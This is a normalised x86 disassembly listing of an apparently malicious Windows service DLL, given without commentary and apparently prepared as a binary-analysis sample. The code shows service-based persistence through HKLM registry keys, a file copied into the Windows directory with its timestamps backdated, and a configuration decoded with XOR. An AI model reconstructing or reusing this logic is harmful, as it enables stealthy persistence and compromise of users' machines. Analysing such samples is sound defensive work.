mov [ ebp - 0x84 ] 0x0
mov [ ebp - 0x184 ] 0x0
call esi
mov edi 0x9c
push edi
lea eax [ ebp - 0x220 ]
push ebx
push eax
call esi
add esp 0x18
lea eax [ ebp - 0x220 ]
push eax
mov [ ebp - 0x220 ] edi
call [ GetVersionExA@IAT ]
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x24c ]
push eax
call [ GetSystemInfo@IAT ]
lea ecx [ ebp - 0x24c ]
push ecx
call eax
jmp r-xdata
lea eax [ ebp - 0x104 ]
push r--data
push eax
call [ strcpy@IAT ]
dec eax
je r-xdata
mov eax [ ebp - 0x210 ]
sub eax ebx
je r-xdata
cmp [ ebp - 0x21c ] 0x4
jne r-xdata
dec eax
jne r-xdata
mov edi [ ebp - 0x224 ]
mov esi [ ebp - 0x228 ]
lea eax [ ebp - 0x184 ]
push eax
lea eax [ ebp - 0x84 ]
push eax
lea eax [ ebp - 0x104 ]
push eax
push r--data
push edi
push esi
call [ _snprintf@IAT ]
mov ecx [ ebp - 0x4 ]
add esp 0x18
mov [ edi + esi - 0x1 ] 0x0
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
mov esi [ strcpy@IAT ]
cmp [ ebp - 0x218 ] ebx
jne r-xdata
mov esi [ strcpy@IAT ]
xor ebx ebx
push 0x5
inc ebx
cmp [ ebp - 0x21c ] 0x6
pop edi
jne r-xdata
cmp [ ebp - 0x218 ] 0xa
jne r-xdata
lea eax [ ebp - 0x104 ]
push r--data
push eax
call esi
cmp [ ebp - 0x20b ] 0x43
pop ecx
pop ecx
je r-xdata
cmp [ ebp - 0x21c ] edi
jne r-xdata
cmp [ ebp - 0x218 ] ebx
jne r-xdata
cmp [ ebp - 0x218 ] 0x5a
jne r-xdata
lea eax [ ebp - 0x104 ]
push r--data
push eax
call esi
cmp [ ebp - 0x20b ] 0x41
pop ecx
pop ecx
je r-xdata
lea eax [ ebp - 0x104 ]
push r--data
push eax
call esi
pop ecx
pop ecx
cmp [ ebp - 0x20b ] 0x42
jne r-xdata
cmp [ ebp - 0x21c ] 0x4
ja r-xdata
cmp [ ebp - 0x218 ] 0x2
jne r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
lea eax [ ebp - 0x104 ]
push r--data
push eax
call esi
cmp [ ebp - 0x21c ] 0x6
pop ecx
pop ecx
jne r-xdata
lea eax [ ebp - 0x104 ]
push r--data
push eax
call esi
jmp r-xdata
lea eax [ ebp - 0x104 ]
push r--data
push eax
call esi
pop ecx
pop ecx
cmp [ ebp - 0x20b ] 0x42
jne r-xdata
cmp [ ebp - 0x21c ] 0x4
jne r-xdata
cmp [ ebp - 0x186 ] bl
jne r-xdata
lea eax [ ebp - 0x104 ]
push r--data
push eax
call esi
pop ecx
pop ecx
cmp [ ebp - 0x218 ] ebx
jne r-xdata
push 0x59
call [ GetSystemMetrics@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
cmp [ ebp - 0x186 ] bl
jne r-xdata
pop ecx
pop ecx
cmp [ ebp - 0x21c ] 0x4
jne r-xdata
cmp [ ebp - 0x186 ] 0x3
je r-xdata
cmp [ ebp - 0x24c ] 0x9
je r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
lea eax [ ebp - 0x104 ]
push r--data
push eax
call esi
pop ecx
pop ecx
cmp [ ebp - 0x21c ] edi
jne r-xdata
cmp [ ebp - 0x186 ] bl
jne r-xdata
push r--data
jmp r-xdata
push r--data
push r--data
jmp r-xdata
cmp [ ebp - 0x21c ] edi
jne r-xdata
cmp [ ebp - 0x186 ] 0x2
jne r-xdata
movzx eax [ ebp - 0x214 ]
push eax
lea eax [ ebp - 0x1ff ]
push eax
lea eax [ ebp - 0x184 ]
push r--data
push eax
call [ sprintf@IAT ]
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x21c ] 0x4
jne r-xdata
lea eax [ ebp - 0x104 ]
push r--data
push eax
call esi
pop ecx
pop ecx
push r--data
cmp [ ebp - 0x24c ] 0x9
jne r-xdata
lea eax [ ebp - 0x104 ]
push eax
call esi
pop ecx
pop ecx
cmp [ ebp - 0x21c ] edi
jne r-xdata
push eax
call esi
pop ecx
pop ecx
cmp [ ebp - 0x218 ] 0x2
jne r-xdata
test [ ebp - 0x188 ] 0x200
lea eax [ ebp - 0x84 ]
je r-xdata
lea eax [ ebp - 0x84 ]
push r--data
push eax
call esi
pop ecx
pop ecx
push r--data
jmp r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
cmp [ ebp - 0x24c ] 0x6
jne r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
test [ ebp - 0x188 ] 0x80
jne r-xdata
cmp [ ebp - 0x24c ] 0x9
jne r-xdata
test [ ebp - 0x188 ] 0x80
je r-xdata
push eax
call esi
pop ecx
pop ecx
push r--data
jmp r-xdata
test [ ebp - 0x188 ] 0x2
je r-xdata
test [ ebp - 0x188 ] 0x80
je r-xdata
test [ ebp - 0x188 ] 0x80
je r-xdata
test [ ebp - 0x188 ] 0x2
je r-xdata
push r--data
jmp r-xdata
lea eax [ ebp - 0x84 ]
push r--data
push r--data
jmp r-xdata
test [ ebp - 0x188 ] 0x2
je r-xdata
test [ ebp - 0x188 ] 0x2
lea eax [ ebp - 0x84 ]
je r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
test [ ebp - 0x188 ] 0x400
lea eax [ ebp - 0x84 ]
je r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
sub_10010fa4
push ebp
mov ebp esp
sub esp 0x14
push esi
mov esi [ RegCreateKeyA@IAT ]
lea eax [ ebp - 0x8 ]
push eax
push r--data
push 0x80000002
mov [ ebp - 0x14 ] 0x2
mov [ ebp - 0xc ] 0x120
call esi
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
push [ ebp - 0x8 ]
call esi
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
push [ ebp - 0x8 ]
mov edi [ RegCloseKey@IAT ]
call edi
mov esi [ RegSetValueExA@IAT ]
push 0x4
pop ebx
push ebx
lea eax [ ebp - 0xc ]
push eax
push ebx
push 0x0
push r--data
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
jmp r-xdata
pop esi
leave
retn
push [ ebp - 0x4 ]
call edi
jmp r-xdata
and [ ebp - 0x10 ] eax
push ebx
lea eax [ ebp - 0x10 ]
push eax
push ebx
push 0x0
push r--data
push [ ebp - 0x4 ]
call esi
test eax eax
jne r-xdata
xor eax eax
push ebx
lea eax [ ebp - 0x14 ]
push eax
push ebx
push 0x0
push r--data
push [ ebp - 0x4 ]
call esi
test eax eax
je r-xdata
mov edi [ strlen@IAT ]
mov ebx r--data
push ebx
call edi
pop ecx
push eax
push ebx
push 0x2
push 0x0
push r--data
push [ ebp - 0x4 ]
call esi
test [ ebp - 0xc ] 0x3
jne r-xdata
mov ebx r--data
push ebx
call edi
pop ecx
push eax
push ebx
push 0x2
push 0x0
push r--data
push [ ebp - 0x4 ]
call esi
xor esi esi
test eax eax
je r-xdata
mov ebx r--data
push ebx
call edi
pop ecx
push eax
push ebx
push 0x2
push 0x0
push r--data
push [ ebp - 0x4 ]
call esi
test eax eax
je r-xdata
inc esi
jmp r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
mov eax esi
jmp r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
pop edi
pop ebx
sub_100110d8
push ebp
mov ebp esp
sub esp 0xa2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov [ ebp - 0xa28 ] eax
xor eax eax
push edi
mov [ ebp - 0xa18 ] eax
mov [ ebp - 0xa14 ] eax
mov [ ebp - 0xa0c ] eax
mov [ ebp - 0xa08 ] eax
mov ebx 0x100
push ebx
lea eax [ ebp - 0x204 ]
push eax
call [ GetSystemDirectoryW@IAT ]
mov esi [ wcscat@IAT ]
lea eax [ ebp - 0x204 ]
push r--data
push eax
call esi
mov edi r--data
lea eax [ ebp - 0x204 ]
push edi
push eax
call esi
lea eax [ ebp - 0x204 ]
push r--data
push eax
call esi
lea eax [ ebp - 0x204 ]
push eax
push r--data
lea eax [ ebp - 0x604 ]
push ebx
push eax
call [ _snwprintf@IAT ]
push edi
push r--data
lea eax [ ebp - 0xa04 ]
push ebx
push eax
call [ _snwprintf@IAT ]
mov ebx [ wcscpy@IAT ]
lea eax [ ebp - 0x804 ]
push r--data
push eax
call ebx
add esp 0x40
lea eax [ ebp - 0x804 ]
push edi
push eax
call esi
lea eax [ ebp - 0x404 ]
push r--data
push eax
call ebx
lea eax [ ebp - 0x404 ]
push edi
push eax
call esi
mov esi [ GetModuleHandleA@IAT ]
add esp 0x18
push r--data
push r--data
call esi
mov ebx [ GetProcAddress@IAT ]
push eax
call ebx
mov [ ebp - 0xa2c ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
push r--data
push r--data
call esi
push eax
call ebx
xor ebx ebx
push ebx
push 0x80
push 0x2
push ebx
push ebx
mov [ ebp - 0xa24 ] eax
push __dos_header
lea eax [ ebp - 0x204 ]
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov esi [ RegCloseKey@IAT ]
xor ebx ebx
cmp [ ebp - 0xa08 ] ebx
je r-xdata
push ebx
lea eax [ ebp - 0xa10 ]
push eax
push [ ebp + 0xc ]
push [ ebp - 0xa28 ]
push esi
call [ WriteFile@IAT ]
push esi
test eax eax
jne r-xdata
cmp [ ebp - 0xa14 ] ebx
je r-xdata
push [ ebp - 0xa08 ]
call esi
call [ CloseHandle@IAT ]
lea eax [ ebp - 0xa0c ]
push eax
mov ebx r--data
push ebx
mov esi 0x80000002
push esi
call [ RegOpenKeyW@IAT ]
test eax eax
je r-xdata
call [ CloseHandle@IAT ]
jmp r-xdata
cmp [ ebp - 0xa0c ] ebx
je r-xdata
push edi
push [ ebp - 0xa0c ]
call [ SHDeleteKeyW@IAT ]
lea eax [ ebp - 0xa08 ]
push eax
push edi
push [ ebp - 0xa0c ]
call [ RegOpenKeyW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0xa0c ]
push eax
push ebx
push esi
call [ RegCreateKeyW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x204 ]
push eax
call [ DeleteFileW@IAT ]
mov eax [ ebp - 0xa18 ]
push [ ebp - 0xa0c ]
call esi
mov esi [ RegSetValueExA@IAT ]
push 0x4
pop ebx
push ebx
lea eax [ ebp - 0xa10 ]
push eax
push ebx
push 0x0
push r--data
push [ ebp - 0xa08 ]
mov [ ebp - 0xa10 ] 0x1
call esi
test eax eax
jne r-xdata
lea eax [ ebp - 0xa08 ]
push eax
push edi
push [ ebp - 0xa0c ]
call [ RegCreateKeyW@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0xa10 ] eax
push ebx
lea eax [ ebp - 0xa10 ]
push eax
push ebx
push 0x0
push r--data
push [ ebp - 0xa08 ]
call esi
test eax eax
jne r-xdata
mov [ ebp - 0xa14 ] 0x1
push ebx
lea eax [ ebp - 0xa10 ]
push eax
push ebx
push 0x0
push r--data
push [ ebp - 0xa08 ]
mov [ ebp - 0xa10 ] 0x3
call esi
test eax eax
jne r-xdata
push r--data
push [ ebp - 0xa08 ]
call [ RegDeleteValueA@IAT ]
mov esi [ wcslen@IAT ]
lea eax [ ebp - 0x604 ]
push eax
call esi
pop ecx
lea eax [ eax + eax + 0x2 ]
push eax
lea eax [ ebp - 0x604 ]
push eax
push 0x2
push 0x0
push r--data
push [ ebp - 0xa08 ]
call [ RegSetValueExW@IAT ]
test eax eax
jne r-xdata
mov ecx r--data
call sub_100071b9
lea eax [ ebp - 0x404 ]
push eax
mov [ ebp - 0xa1c ] eax
call esi
add eax eax
mov [ ebp - 0xa1e ] ax
mov [ ebp - 0xa20 ] ax
pop ecx
lea eax [ ebp - 0xa20 ]
push eax
call [ ebp - 0xa24 ]
lea eax [ ebp - 0xa20 ]
push eax
call [ ebp - 0xa2c ]
test eax eax
js r-xdata
mov [ ebp - 0xa18 ] 0x1
sub_10011440
push ebp
mov ebp esp
mov eax 0x1606c
call sub_10014ee0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor ebx ebx
push 0x14
mov edi edx
mov [ edi ] bl
mov [ ebp - 0x16050 ] eax
mov [ esi ] ebx
mov [ ecx ] bl
mov [ eax ] bl
pop eax
mov [ ebp - 0x16054 ] eax
push 0x2
mov [ ebp - 0x1606c ] eax
lea eax [ ebp - 0x244 ]
mov [ ebp - 0x1605c ] eax
mov [ ebp - 0x16058 ] ecx
pop ecx
lea eax [ ebp - 0x16054 ]
push eax
lea eax [ ebp - 0x1606c ]
push eax
push 0x4b
push ebx
mov [ ebp - 0x244 ] 0x1
mov [ ebp - 0x238 ] ecx
mov [ ebp - 0x16068 ] ebx
mov [ ebp - 0x16064 ] ecx
mov [ ebp - 0x16060 ] ebx
call [ InternetQueryOptionA@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebp - 0x240 ] 0x2
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
mov eax [ ebp - 0x234 ]
cmp eax ebx
je r-xdata
test [ ebp - 0x228 ] 0xc
je r-xdata
cmp [ edi ] bl
je r-xdata
cmp [ eax ] bl
je r-xdata
xor eax eax
inc eax
call sub_100106ce
fcomp [ r--data ]
lea ecx [ ebp - 0x16048 ]
fnstsw ax
test ah 0x1
jne r-xdata
push [ ebp - 0x234 ]
call [ GlobalFree@IAT ]
push 0x3a
push eax
call [ strchr@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1000e5a6
call sub_1000ead9
jmp r-xdata
push 0x3a
push [ ebp - 0x234 ]
call [ strchr@IAT ]
mov [ eax ] bl
inc eax
push eax
call [ atoi@IAT ]
add esp 0xc
push 0x100
push [ ebp - 0x234 ]
mov [ esi ] eax
push edi
call [ strncpy@IAT ]
add esp 0xc
push [ esi ]
lea eax [ ebp - 0x208 ]
push edi
push r--data
push 0x100
push eax
call [ _snwprintf@IAT ]
xor eax eax
add esp 0x14
xor esi esi
mov [ ebp - 0xa ] ax
cmp [ ebp - 0x1604c ] ebx
jbe r-xdata
mov [ ebp - 0x1604c ] eax
cmp eax ebx
je r-xdata
lea edi [ ebp - 0x15fc8 ]
mov edi [ WideCharToMultiByte@IAT ]
imul esi esi 0x380
push ebx
push ebx
push 0x40
push [ ebp - 0x16058 ]
lea eax [ ebp + esi - 0x15dc8 ]
push 0xffffffff
push eax
push ebx
push 0x1
call edi
push ebx
push ebx
push 0x40
push [ ebp - 0x16050 ]
lea eax [ ebp + esi - 0x15d48 ]
push 0xffffffff
push eax
push ebx
push 0x1
call edi
inc esi
add edi 0x380
cmp esi [ ebp - 0x1604c ]
jb r-xdata
lea eax [ ebp - 0x208 ]
push eax
call [ wcslen@IAT ]
pop ecx
push eax
lea eax [ ebp - 0x208 ]
push edi
push eax
call [ _wcsnicmp@IAT ]
add esp 0xc
test eax eax
je r-xdata
jmp r-xdata
sub_1001163d
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x64
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x60 ] eax
mov eax [ ebp + 0x8 ]
mov [ esp + 0xc ] eax
mov eax [ ebp + 0xc ]
mov [ esp + 0x8 ] eax
mov eax [ ebp + 0x10 ]
push ebx
mov [ esp + 0x18 ] eax
mov eax [ ebp + 0x14 ]
push esi
mov [ esp + 0x18 ] eax
push edi
lea eax [ esp + 0x24 ]
push eax
lea eax [ esp + 0x2c ]
push eax
xor ebx ebx
mov [ esp + 0x2c ] 0x40
call [ GetUserNameA@IAT ]
call sub_1000711a
mov edi [ _stricmp@IAT ]
and eax 0xffff0000
mov esi r--data
cmp eax 0x6000000
push esi
lea eax [ esp + 0x2c ]
push eax
jb r-xdata
call edi
pop ecx
pop ecx
test eax eax
jne r-xdata
call edi
pop ecx
pop ecx
test eax eax
jne r-xdata
push [ esp + 0x1c ]
mov ecx [ esp + 0x24 ]
push [ esp + 0x18 ]
mov edx [ esp + 0x20 ]
call sub_10011440
mov ebx eax
lea eax [ esp + 0x30 ]
push esi
push eax
call edi
add esp 0x10
test eax eax
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea eax [ esp + 0x14 ]
push eax
call sub_10010970
lea eax [ esp + 0xc ]
push eax
lea eax [ esp + 0x14 ]
push eax
call sub_100107a8
jmp r-xdata
mov ecx [ esp + 0x6c ]
pop edi
pop esi
mov eax ebx
pop ebx
xor ecx esp
call sub_10014571
mov esp ebp
pop ebp
retn
push [ esp + 0xc ]
push [ esp + 0x14 ]
call sub_10010950
pop ecx
pop ecx
pop ecx
pop ecx
test eax eax
je r-xdata
sub_1001172b
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0x4 ] eax
test eax eax
js r-xdata
xor eax eax
cmp eax 0x6
jle r-xdata
push [ ebp + 0x20 ]
mov ecx [ esi + 0x8 ]
push [ ebp + 0x1c ]
mov edx [ ecx ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ edx + 0x2c ]
jmp r-xdata
cmp eax 0x7
jne r-xdata
pop esi
pop ebp
retn 0x1c
call sub_10001614
mov esi [ esi + 0xc ]
push eax
push [ ebp + 0x14 ]
call sub_10001857
jmp r-xdata
sub_1001177c
push 0x4
mov eax sub_100152fc
call sub_10015102
mov ebx [ operator new@IAT ]
and [ edi + 0x4 ] 0x0
push 0x22c
mov [ edi ] r--data
call ebx
pop ecx
mov [ ebp - 0x10 ] eax
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov esi eax
call sub_1000c208
jmp r-xdata
xor eax eax
mov esi eax
call sub_1000166b
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push 0x32110
mov [ edi + 0x8 ] eax
call ebx
pop ecx
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
mov eax edi
call sub_1001516b
retn
sub_100117df
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100117ff
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
pop ecx
sub_100117ff
push esi
mov esi ecx
mov ecx [ esi + 0x8 ]
mov [ esi ] r--data
test ecx ecx
je r-xdata
mov ecx [ esi + 0xc ]
pop esi
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
ServiceMain
push ebp
mov ebp esp
sub esp 0x354
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov esi 0x100
push esi
push [ eax ]
mov edi rw-data
push edi
mov [ ebp - 0x354 ] eax
call [ wcstombs@IAT ]
call sub_10012ca6
mov ebx [ memset@IAT ]
push 0x200
lea eax [ ebp - 0x344 ]
push 0x0
push eax
call ebx
push 0x40
lea eax [ ebp - 0x44 ]
push 0x0
push eax
call ebx
push edi
lea eax [ ebp - 0x144 ]
push r--data
push eax
mov [ ebp - 0x144 ] 0x0
call [ sprintf@IAT ]
add esp 0x30
lea eax [ ebp - 0x34c ]
push eax
push 0xf003f
push 0x0
lea eax [ ebp - 0x144 ]
push eax
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
mov ebx [ RegQueryValueExA@IAT ]
lea eax [ ebp - 0x348 ]
push eax
lea eax [ ebp - 0x144 ]
push eax
lea eax [ ebp - 0x350 ]
push eax
push 0x0
push r--data
push [ ebp - 0x34c ]
mov [ ebp - 0x348 ] esi
call ebx
test eax eax
jne r-xdata
mov ebx [ LoadLibraryW@IAT ]
lea eax [ ebp - 0x344 ]
push eax
call ebx
mov [ rw-data ] eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x44 ]
push r--data
push eax
call [ strcpy@IAT ]
pop ecx
pop ecx
lea eax [ ebp - 0x348 ]
push eax
lea eax [ ebp - 0x144 ]
push eax
lea eax [ ebp - 0x350 ]
push eax
push 0x0
push r--data
push [ ebp - 0x34c ]
call ebx
test eax eax
jne r-xdata
cmp [ ebp - 0x350 ] 0x3
jne r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push eax
call esi
test eax eax
je r-xdata
push r--data
push edi
call [ _stricmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
push [ ebp - 0x34c ]
call [ RegCloseKey@IAT ]
cmp [ ebp - 0x350 ] 0x1
jne r-xdata
mov eax [ ebp - 0x348 ]
cdq
sub eax edx
sar eax 0x1
xor ecx ecx
test eax eax
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
push [ rw-data ]
call esi
test eax eax
jne r-xdata
push [ rw-data ]
call eax
push r--data
push edi
call [ _stricmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
lea eax [ ebp - 0x344 ]
push eax
push r--data
jmp r-xdata
mov eax [ ebp - 0x348 ]
mov [ ebp + eax - 0x144 ] 0x0
lea eax [ ebp - 0x144 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call [ strcpy@IAT ]
pop ecx
pop ecx
push esi
lea eax [ ebp - 0x344 ]
push eax
lea eax [ ebp - 0x144 ]
push eax
call [ ExpandEnvironmentStringsW@IAT ]
xor [ ebp + ecx * 2 - 0x144 ] 0x7c
inc ecx
cmp ecx eax
jl r-xdata
push [ ebp - 0x354 ]
push [ ebp + 0x8 ]
call eax
jmp r-xdata
push r--data
push [ rw-data ]
call esi
test eax eax
jne r-xdata
push r--data
push edi
call [ _stricmp@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
lea eax [ ebp - 0x344 ]
push eax
push r--data
jmp r-xdata
call [ ExpandEnvironmentStringsW@IAT ]
lea eax [ ebp - 0x344 ]
push eax
call ebx
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn 0x8
push r--data
push [ rw-data ]
call esi
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push esi
lea eax [ ebp - 0x344 ]
push eax
push r--data
push 0xffffffff
call [ Sleep@IAT ]
sub_10011bff
push ebp
mov ebp esp
sub esp 0x244
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov [ ebp - 0x234 ] eax
mov eax [ ebp + 0xc ]
push edi
lea edi [ ebp - 0xc ]
mov [ ebp - 0x238 ] eax
call sub_100073aa
push 0x10
lea eax [ ebp - 0x1c ]
push 0x0
push eax
mov [ ebp - 0x9 ] 0x0
call [ memset@IAT ]
add esp 0xc
push 0x8
lea eax [ ebp - 0x1c ]
push eax
push 0xffffffff
mov eax edi
push eax
push 0x0
push 0x1
call [ MultiByteToWideChar@IAT ]
push 0xff
lea eax [ ebp - 0x220 ]
push eax
call [ GetWindowsDirectoryW@IAT ]
mov esi [ wcscat@IAT ]
lea eax [ ebp - 0x220 ]
push r--data
push eax
call esi
lea eax [ ebp - 0x220 ]
push r--data
push eax
call esi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x220 ]
push eax
call esi
mov ebx r--data
lea eax [ ebp - 0x220 ]
push ebx
push eax
call esi
mov edi [ wcscpy@IAT ]
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x238 ]
call edi
add esp 0x28
push 0x0
lea eax [ ebp - 0x220 ]
push eax
push rw-data
call [ CopyFileW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x230 ]
push eax
call [ GetSystemTime@IAT ]
mov eax 0x7d5
mov [ ebp - 0x230 ] ax
lea eax [ ebp - 0x240 ]
push eax
lea eax [ ebp - 0x230 ]
push eax
call [ SystemTimeToFileTime@IAT ]
xor eax eax
push eax
push 0x80
push 0x3
push eax
push eax
push __dos_header
lea eax [ ebp - 0x220 ]
push eax
call [ CreateFileW@IAT ]
mov [ ebp - 0x238 ] eax
cmp eax 0xffffffff
je r-xdata
call [ GetLastError@IAT ]
xor al al
jmp r-xdata
push r--data
push [ ebp - 0x234 ]
call edi
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x234 ]
call esi
push ebx
push [ ebp - 0x234 ]
call esi
add esp 0x18
mov al 0x1
lea ecx [ ebp - 0x240 ]
push ecx
push ecx
push ecx
push eax
call [ SetFileTime@IAT ]
push [ ebp - 0x238 ]
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
sub_10011d8e
push ebp
mov ebp esp
sub esp 0x410
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
lea eax [ ebp - 0x40c ]
push eax
push 0x1
xor ebx ebx
push ebx
push r--data
push 0x80000002
call [ RegOpenKeyExW@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov al bl
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
lea eax [ ebp - 0x408 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
lea eax [ ebp - 0x410 ]
push eax
push ebx
push r--data
push [ ebp - 0x40c ]
mov [ ebp - 0x408 ] 0x3ff
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x40c ]
call [ RegCloseKey@IAT ]
cmp [ ebp - 0x410 ] 0x3
jne r-xdata
push esi
mov esi 0x1a8
cmp [ ebp - 0x408 ] esi
jb r-xdata
pop esi
xor ecx ecx
cmp [ ebp - 0x408 ] ebx
jle r-xdata
push esi
lea eax [ ebp - 0x404 ]
push eax
push edi
call [ memcpy@IAT ]
add esp 0xc
mov bl 0x1
lea eax [ ebp + ecx - 0x404 ]
mov dl [ eax ]
xor dl 0x5f
inc ecx
not dl
mov [ eax ] dl
cmp ecx [ ebp - 0x408 ]
jl r-xdata
sub_10011e65
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x1bc
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1b8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ memcpy@IAT ]
push edi
mov edi 0x1a8
push edi
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x1c ]
push rw-data
push eax
mov [ esp + 0x1b ] 0x0
call esi
movsx eax [ esp + 0x64 ]
mov ebx [ isalnum@IAT ]
push eax
call ebx
add esp 0x10
test eax eax
je r-xdata
cmp [ esp + 0x58 ] 0x0
je r-xdata
movsx eax [ esp + 0x59 ]
push eax
call ebx
pop ecx
test eax eax
je r-xdata
mov ecx [ esp + 0x1c4 ]
mov al [ esp + 0xf ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10014571
mov esp ebp
pop ebp
retn
xor eax eax
mov [ esp + 0x10 ] eax
cmp [ esp + 0x158 ] 0x7e900
jae r-xdata
mov ecx [ esp + 0x10 ]
add [ esp + 0x10 ] 0x8
mov edx 0x41f22d76
sar edx cl
xor [ esp + eax + 0x18 ] dl
inc eax
cmp [ esp + 0x10 ] 0xd40
jb r-xdata
movsx eax [ esp + 0x58 ]
push eax
call ebx
pop ecx
test eax eax
je r-xdata
cmp [ esp + 0x17c ] 0xa
jb r-xdata
movsx eax [ esp + 0x59 ]
push eax
call ebx
pop ecx
test eax eax
je r-xdata
push edi
lea eax [ esp + 0x1c ]
push eax
push [ esp + 0x1c ]
call esi
mov [ esp + 0x1b ] 0x1
add esp 0xc
sub_10011f52
push ebp
mov ebp esp
sub esp 0x8c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi ecx
call sub_10011d8e
test al al
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10014571
leave
retn
push edi
call sub_10011e65
mov bl al
pop ecx
test bl bl
je r-xdata
mov al bl
cmp [ edi ] 0x0
jne r-xdata
call [ rand@IAT ]
cdq
mov ecx 0x270f
idiv ecx
mov esi [ strlen@IAT ]
push edx
push r--data
push edi
call esi
pop ecx
push 0x40
pop ecx
sub ecx eax
push ecx
push edi
call esi
pop ecx
add eax edi
push eax
call [ _snprintf@IAT ]
add esp 0x10
lea eax [ ebp - 0x8c ]
push eax
lea eax [ ebp - 0x88 ]
push eax
mov [ ebp - 0x8c ] 0x80
call [ GetComputerNameA@IAT ]
call [ rand@IAT ]
cdq
mov ecx 0x270f
idiv ecx
lea eax [ ebp - 0x88 ]
push edx
push eax
push r--data
push 0x40
push edi
call [ _snprintf@IAT ]
add esp 0x14
jmp r-xdata
mov [ edi + 0x3f ] 0x0
call sub_10012022
sub_10012022
push ebp
mov ebp esp
sub esp 0x408
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x408 ]
push eax
push 0x2
push 0x0
push r--data
push 0x80000002
